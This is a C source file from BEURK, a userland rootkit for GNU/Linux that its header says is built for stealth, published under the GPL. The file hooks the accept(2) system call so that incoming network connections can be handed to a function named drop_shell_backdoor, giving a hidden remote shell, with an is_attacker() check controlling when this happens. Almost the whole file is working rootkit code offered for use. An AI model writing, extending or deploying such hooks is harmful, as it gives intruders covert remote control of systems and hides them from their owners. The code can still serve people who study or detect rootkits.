/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <sys/socket.h> /* struct sockaddr, socklen_t */
#include "beurk.h" /* is_attacker(), drop_shell_backdoor() */
#include "config.h" /* REAL_ACCEPT() */
#include "debug.h" /* DEBUG() */
#include "hooks.h" /* prototype */

int         accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
    init();
    DEBUG(D_INFO, "called accept(2) hook");

    int     sock;

    if (is_attacker())
        return REAL_ACCEPT(sockfd, addr, addrlen);

    sock = REAL_ACCEPT(sockfd, addr, addrlen);
    return drop_shell_backdoor(sock, addr);
}
